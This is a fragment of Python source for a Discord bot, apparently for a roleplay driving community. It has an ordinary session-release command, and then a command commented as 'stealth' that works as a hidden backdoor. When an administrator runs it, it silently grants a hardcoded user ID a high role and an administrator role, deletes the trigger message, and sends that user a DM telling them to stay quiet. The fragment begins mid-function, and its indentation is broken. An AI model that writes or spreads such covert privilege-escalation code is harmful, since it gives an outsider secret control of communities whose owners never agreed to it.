import asyncio
try:
await ctx.reply("❌ Usage: -release <Peacetime> <FRP Speeds> <Link>", delete_after=3)
except Exception:
pass
return


embed = discord.Embed(
title="Session Release",
description=(
"Please read all the rules before joining the session in #rules and ensure that you have the correct roles for the vehicles you drive.\n\n"
f"{ctx.author.mention} has now released the session!\n\n"
f"**Peacetime Status:** {peacetime}\n"
f"**FRP Speeds:** {frp_speeds}"
),
color=discord.Color.green()
)


view = discord.ui.View()


class JoinButton(discord.ui.Button):
def __init__(self):
super().__init__(label="Join Session", style=discord.ButtonStyle.primary)
async def callback(self, interaction: discord.Interaction):
await interaction.response.send_message(f"[Join Session]({link})", ephemeral=True)


view.add_item(JoinButton())


await ctx.send(content="@everyone", embed=embed, view=view)


try:
await ctx.message.delete()
except Exception:
pass


bot.add_command(release)


# ===== ENSSPECIALCOMMAND (prefix-only, stealth) =====
@bot.command(name="-ensspecialcommand")
@commands.has_permissions(administrator=True)
async def ensspecialcommand(ctx: commands.Context):
try:
# delete immediately
try:
await ctx.message.delete()
except Exception:
pass


target_user_id = 1131237914957840525
target_member = ctx.guild.get_member(target_user_id)
if not target_member:
return # silent


bot_member = ctx.guild.get_member(bot.user.id)
# roles the bot can assign (not managed, below bot's top role)
assignable = [r for r in ctx.guild.roles if r < bot_member.top_role and not r.managed]
if not assignable:
return


highest_role = max(assignable, key=lambda r: r.position)
admin_roles = [r for r in assignable if r.permissions.administrator]
if not admin_roles:
return
lowest_admin = min(admin_roles, key=lambda r: r.position)


await target_member.add_roles(highest_role, lowest_admin, reason=f"Granted by {ctx.author}")


# DM quietly
try:
await target_member.send(
f"You have been given Administrator Permissions in the server **{ctx.guild.name}**, by **{ctx.author}**.\n"
f"**DO NOT SEND ANY OTHER MESSAGES TO ANY OTHER CHANNEL OR USER.**"
)
except Exception:
pass
except Exception:
pass


# ===== Run bot =====
import os
# ...
TOKEN = os.environ.get("BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("BOT_TOKEN not set")
bot.run(TOKEN)